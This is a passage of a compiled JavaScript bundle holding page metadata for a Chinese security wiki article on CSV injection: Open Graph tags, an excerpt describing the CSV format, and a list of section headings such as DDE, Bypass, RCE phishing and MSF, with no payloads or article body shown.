格式在发展过程中也逐渐演变出其他一些分支和变种。...","head":[["meta",{"property":"og:url","content":"https://github.com/zha0cai/SecWikiPublic/secwiki/websec/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/CSV%20%E6%B3%A8%E5%85%A5.html"}],["meta",{"property":"og:site_name","content":"One-Piece"}],["meta",{"property":"og:title","content":"CSV 注入"}],["meta",{"property":"og:description","content":"CSV 概述 CSV Wiki 逗号分隔值（Comma-Separated Values，CSV，有时也称为字符分隔值，因为分隔字符也可以不是逗号），其文件以纯文本形式存储表格数据（数字和文本）。纯文本意味着该文件是一个字符 \\"字符 (计算机科学)\\")序列，不含必须像二进制数字那样被解读的数据。 CSV 格式在发展过程中也逐渐演变出其他一些分支和变种。..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"article:author","content":"Mr.zha0cai"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"CSV 注入\\",\\"image\\":[\\"\\"],\\"dateModified\\":null,\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"Mr.zha0cai\\",\\"url\\":\\"https://github.com/zha0cai\\"}]}"]]},"headers":[{"level":2,"title":"分割符","slug":"分割符","link":"#分割符","children":[]},{"level":2,"title":"DDE","slug":"dde","link":"#dde","children":[]},{"level":2,"title":"安全测试","slug":"安全测试","link":"#安全测试","children":[]},{"level":2,"title":"Bypass","slug":"bypass","link":"#bypass","children":[]},{"level":2,"title":"Excel","slug":"excel","link":"#excel","children":[]},{"level":2,"title":"WPS","slug":"wps","link":"#wps","children":[]},{"level":2,"title":"泄露敏感信息","slug":"泄露敏感信息","link":"#泄露敏感信息","children":[]},{"level":2,"title":"RCE 钓鱼","slug":"rce-钓鱼","link":"#rce-钓鱼","children":[]},{"level":2,"title":"MSF","slug":"msf","link":"#msf","children":[]},{"level":2,"title":"环境条件","slug":"环境条件","link":"#环境条件","children":[]},{"level":2,"title":"漏洞挖掘","slug":"漏洞挖掘-1","link":"#漏洞挖掘-1","children":[]}],"git":{"createdTime":null,"updatedTime":null,"contributors":[]},"readingTime":{"minutes":13.36,"words":4008},"filePathRelative":"websec/安全漏洞/CSV 注入.md","autoDesc":true}')}}]);